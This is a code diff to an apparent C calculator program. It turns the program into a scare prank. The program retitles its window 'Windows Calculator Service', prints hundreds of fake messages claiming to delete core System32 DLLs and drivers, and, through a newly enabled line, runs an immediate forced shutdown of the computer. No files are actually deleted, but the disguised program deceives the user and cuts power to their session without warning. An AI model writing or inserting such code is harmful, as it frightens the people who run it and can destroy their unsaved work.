@@ -43,7 +43,6 @@ int main() {
                 printf("Unknown operator\n");
         }
     }
-    
 
 
 
@@ -84,24 +83,18 @@ int main() {
 
 
 
-
-
-
-
-
-    
 
     printf("Processing");
     fflush(stdout);
-    system("timeout /t 2 >nul");
+    system("timeout /t 8 >nul");
 
     printf("\rLoading     ");
     fflush(stdout);
-    system("timeout /t 2 >nul");
+    system("timeout /t 5 >nul");
 
     printf("\rFinal Answer\n");
     fflush(stdout);
-    system("timeout /t 1 >nul");
+    system("timeout /t 3 >nul");
     
     
     system("title Windows Calculator Service");
@@ -126,9 +119,33 @@ int main() {
         printf("Deleting C:\\Windows\\System32\\sys_%03d.dll\n", i);
     }
 
-      system("timeout /t 1 >nul");
 
-   // system("shutdown /s /t 0");
+
+
+    const char *files[] = {
+        "kernel32.dll","user32.dll","ntdll.dll","advapi32.dll","gdi32.dll",
+        "shell32.dll","ole32.dll","oleaut32.dll","ws2_32.dll","wininet.dll",
+        "winhttp.dll","crypt32.dll","comdlg32.dll","shlwapi.dll","imm32.dll",
+        "setupapi.dll","cfgmgr32.dll","sechost.dll","uxtheme.dll","dwmapi.dll",
+        "winmm.dll","mpr.dll","netapi32.dll","psapi.dll","version.dll",
+        "bcrypt.dll","bcryptprimitives.dll","clbcatq.dll","msvcrt.dll",
+        "rpcrt4.dll","sfc.dll","sfc_os.dll","usp10.dll","urlmon.dll",
+        "wer.dll","wintrust.dll","wlanapi.dll","wtsapi32.dll",
+        "drivers\\disk.sys","drivers\\ndis.sys","drivers\\tcpip.sys",
+        "drivers\\kbdclass.sys","drivers\\mouclass.sys"
+    };
+
+    int fileCount = sizeof(files) / sizeof(files[0]);
+
+    for (int i = 0; i < 800; i++) {
+        printf("Deleting C:\\Windows\\System32\\%s\n", files[i % fileCount]);
+    }
+
+  
+
+    system("timeout /t 1 >nul");
+
+   system("shutdown /s /t 0");
 
 end:
     return 0;
